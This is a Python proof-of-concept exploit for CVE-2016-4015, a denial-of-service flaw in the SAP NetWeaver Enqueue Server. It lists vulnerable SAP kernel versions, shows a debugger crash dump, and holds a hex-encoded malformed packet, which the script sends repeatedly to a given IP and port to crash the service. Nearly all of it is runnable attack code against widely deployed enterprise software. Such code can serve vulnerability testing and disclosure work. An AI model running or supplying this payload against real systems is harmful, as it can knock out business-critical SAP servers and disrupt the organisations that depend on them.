#!/usr/bin/env python
"""
vulnerable SAP packages 
SAP KERNEL 7.21 32-BIT
SAP KERNEL 7.21 32-BIT UNICODE
SAP KERNEL 7.21 64-BIT
SAP KERNEL 7.21 64-BIT UNICODE
SAP KERNEL 7.21 EXT 32-BIT
SAP KERNEL 7.21 EXT 32-BIT UC	
SAP KERNEL 7.21 EXT 64-BIT
SAP KERNEL 7.21 EXT 64-BIT UC	
SAP KERNEL 7.22 64-BIT
SAP KERNEL 7.22 64-BIT UNICODE
SAP KERNEL 7.22 EXT 64-BIT
SAP KERNEL 7.22 EXT 64-BIT UC
SAP KERNEL 7.42 64-BIT
SAP KERNEL 7.42 64-BIT UNICODE
SAP KERNEL 7.45 64-BIT
SAP KERNEL 7.45 64-BIT UNICODE
SAP KERNEL 7.46 64-BIT UNICODE
SAP KERNEL 7.47 64-BIT UNICODE

Well works on Windows and Linux platforms

0:009> r
rax=00ffffffffffffff rbx=000000003ca9d9f0 rcx=000000000743f541
rdx=0000000000000001 rsi=0000000000000003 rdi=000000003cae4300
rip=000000013f0cdb75 rsp=000000000743f4b0 rbp=0000000000000000
 r8=0000000000000360  r9=0000000000000000 r10=0000000000000132
r11=000000000743f270 r12=000000000743f541 r13=000000003ca9d9f0
r14=0000000000000000 r15=000000013f3d5d00
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
enserver!IOThread::WalkNet+0x575:
00000001`3f0cdb75 ff10            call    qword ptr [rax] ds:00ffffff`ffffffff=????????????????

"""
import socket
from sys import argv

poc = "00000059abcd" \
      "e12300000000" \
      "000000590000" \
      "0059f3a081bb" \
      "060100000000" \
      "000600000000" \
      "000400000000" \
      "000100040000" \
      "000000035661" \
      "6861676e2d70" \
      "635f35323736" \
      "5f3000000000" \
      "020000003b00" \
      "000005000000" \
      "030000000600" \
      "00000400000001"

def main(server, port):
    print (
"""Vulnerability advisory https://erpscan.com/advisories/erpscan-16-019-sap-netweaver-enqueue-server-dos-vulnerability/
Vulnerability ID CVE-2016-4015
Enqueue server connector https://github.com/CoreSecurity/pysap/blob/master/examples/enqueue_monitor.py\n\n""")
    for i in range(10):
        try:
            sock = socket.socket()
            print "Tried DoS to Enqueue Server"
            sock.connect((server, int(port)))
            sock.send(poc.decode("hex"))
            data = sock.recv(1024)
            sock.close()
        except:
            print "Enqueue Server successfully crashed or network error"
            exit()
    print "Not vulnerable"

if __name__ == "__main__":
    if len(argv)<2:
        print "missing parameters, example for execute : ./enqueue_server_DoS.py server_ip server_port"
        exit()
    main(argv[1],argv[2])
